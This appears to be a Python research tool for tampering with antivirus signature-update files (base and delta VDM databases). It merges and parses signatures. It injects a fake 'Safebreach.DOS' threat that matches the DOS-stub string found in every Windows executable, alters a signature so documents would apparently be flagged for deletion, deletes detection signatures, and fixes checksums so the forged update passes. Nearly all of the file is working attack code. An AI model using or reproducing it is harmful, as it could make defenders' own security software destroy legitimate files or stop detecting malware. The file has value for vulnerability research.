import logging

from dual.add import AddThreat
from dual.modify import ModifyInterval
from dual.delete import DeleteInterval, DeleteIntervals

from core.vdm.base import BaseVdm
from core.vdm.delta import DeltaVdm

from core.merge import Merger
from core.signatures import Signature
from core.signatures.threat import Threat, ThreatBegin, ThreatEnd
from core.signatures.deltablob import Action, CopyFromDelta

class Pair:
    def __init__(self, basevdm: BaseVdm, deltavdm: DeltaVdm):
        self.basevdm = basevdm
        self.deltavdm = deltavdm
    
    def add_dos_threat(self):
        deleter = DeleteIntervals(self, [])

        threats = Merger(self.basevdm, self.deltavdm).merge()
        threats_stream = threats.get_stream()
        threats_stream.seek(0)

        while True:
            sig = Signature.read_one(threats_stream)

            if not sig:
                break
            
            if sig.type == 0x70:
                deleter.add(sig.interval)

        deleter.run()
        
        begin = ThreatBegin(id=0x337, category=34, name=b"Safebreach.DOS", footer=b'\x70\x00\x04\x00')
        end = ThreatEnd(_id=0x337)
        dos_threat = Threat()
        dos_threat.begin = begin
        dos_threat.end = end

        dos_hstr = Signature(0x78, b'\x01\x00\x01\x00\x01\x00\x00\x01\x00\x27\x01!This program cannot be run in DOS mode\x00\x00')
        
        dos_threat.push(dos_hstr)
       
        AddThreat(self, dos_threat).run()
        #self.finallize_blob()

    def delete_test(self):
        threats = Merger(self.basevdm, self.deltavdm).merge()
        stream = threats.get_stream()
        stream.seek(0)
        target = None

        while True:
            signature = Signature.read_one(stream)

            if not signature:
                break
            
            if signature.type == 0x96:
                target = signature
                logging.info(signature.__str__())
                break

        if target:
            logging.info("Starting modification ...")
            new_data = b'\x96\x1f\x00\x00\x00\x00\x1b\x00\x21\x23\x4c\x75\x61\x3a\x44\x6c\x6c\x53\x75\x73\x70\x69\x63\x69\x6f\x75\x73\x45\x78\x70\x6f\x72\x74\x2e\x41'
            logging.info(new_data)
            ModifyInterval(self, signature.interval, new_data).run()
            self.finallize_blob()
        
    def modify_specific_signature_to_delete_documetns(self):
        threats = Merger(self.basevdm, self.deltavdm).merge()
        target = None

        for t in threats:
            if t.id == 0x80041717:
                target = t
                break
        
        if target:
            brute_interval = target.pop().interval
            brute_interval += target.begin.interval.end
            brute_interval.start = brute_interval.start - 5
            
            ModifyInterval(self, brute_interval, b'\x96\x1d\x00\x00\x00\x00\x19\x00\x4c\x75\x61\x3a\x44\x6c\x6c\x53\x75\x73\x70\x69\x63\x69\x6f\x75\x73\x45\x78\x70\x6f\x72\x74\x2e\x41').run()
            
        self.finallize_blob()

    def delete_match(self, name: bytes):
        threats = Merger(self.basevdm, self.deltavdm).merge()
        deleter = DeleteIntervals(self, [])

        for threat in threats.match(name):
            print(f"      Deleting => {threat.name}")
            deleter.add(threat.interval)

        deleter.run()
        self.finallize_blob()

    def delete_threat(self, id: int = None, name: bytes = None):
        threat = self.merge().get(id, name)

        if threat:
            del_action = DeleteInterval(self, threat.interval)
            del_action.run()

        self.finallize_blob()

    def merge(self):
        return Merger(self.basevdm, self.deltavdm).merge()

    def normalize(self, actions: list[Action]):
        for i, new_action in enumerate(actions):
            if new_action.type and new_action.size < 6:
                current_offset = self.basevdm.signatures.tell()
                self.basevdm.signatures.seek(new_action.offset)
                data = self.basevdm.signatures.read(new_action.size)
                self.basevdm.signatures.seek(current_offset)
                actions[i] = CopyFromDelta(data)

    def export(self, path: str = None):
        self.basevdm.save(path)
        self.deltavdm.inc_version_build_number()
        self.deltavdm.save(path)

    def finallize_blob(self):
        merger = Merger(self.basevdm, self.deltavdm)
        threats = merger.merge()

        self.deltavdm.blob.mergesize = threats.size()
        self.deltavdm.blob.mergecrc  = threats.crc32()
    
    @property
    def delta(self):
        return self.deltavdm
    
    @property
    def base(self):
        return self.basevdm